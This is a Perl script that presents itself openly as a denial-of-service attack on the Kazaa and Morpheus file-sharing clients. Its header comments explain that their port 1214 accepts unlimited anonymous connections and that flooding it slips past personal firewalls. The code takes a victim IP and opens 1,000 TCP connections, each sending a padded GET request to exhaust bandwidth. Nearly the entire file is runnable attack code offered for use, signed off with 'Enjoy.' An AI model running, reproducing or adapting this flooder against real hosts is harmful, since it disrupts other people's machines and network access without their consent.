#!/usr/bin/perl
#
#Kazaa/Morpheus Denial of Service Attack
#Coded by Paul Godfrey
#PaulG@Crackdealer.com
#
#Problem: Both Kazaa and Morpheus file sharing applications has a port
#which allow anonymous file access to their shared folder. What does this have
#to do with Denial of Service? Unlike connections made from other users
#of the applications, the number of connections to the port cannot be
#regulated or detected by the client. This obviously will allow us to flood the
#server with requests and therefore use up all of the available bandwidth.
#Also due to the fact that most users have setup their firewall privileges so
#that Kazaa or Morpheus is allowed access to open connections to outside sources
#this attack will bypass most personal firewall clients.
#
#Enjoy.
#
#Usage: ./km.pl -h victimip

use Socket; 
use Getopt::Std; 

getopts("h:", \%args); 

print("\nK/M Denial of Service\n"); 
if (!defined $args{h}) { 
print("Usage: km.pl -h victimip\n\n"); 
exit; } 

$host = $args{h}; 
$target = inet_aton($host) || die("inet_aton problems; host doesn't exist?"); 

$trash="A"x100;

&exec_cmd($command); 

sub exec_cmd { 
for($count=1;$count<=1000;$count++)
{
sendraw("GET /\"$trash\" HTTP/1.0\n\n");
print("|");
}
print("\nData Sent.\n\n"); 
} 

sub sendraw { 
my ($pstr)=@_; 
socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) || 
die("Socket problems\n"); 
if(connect(S,pack "SnA4x8",2,1214,$target)){ 
my @in; 
select(S); $|=1; print $pstr; 
while(< S >){ push @in, $_; 
print STDOUT "." if(defined $args{X});} 
select(STDOUT); close(S); return @in; 
} else { die("Can't connect...\n"); } 
}

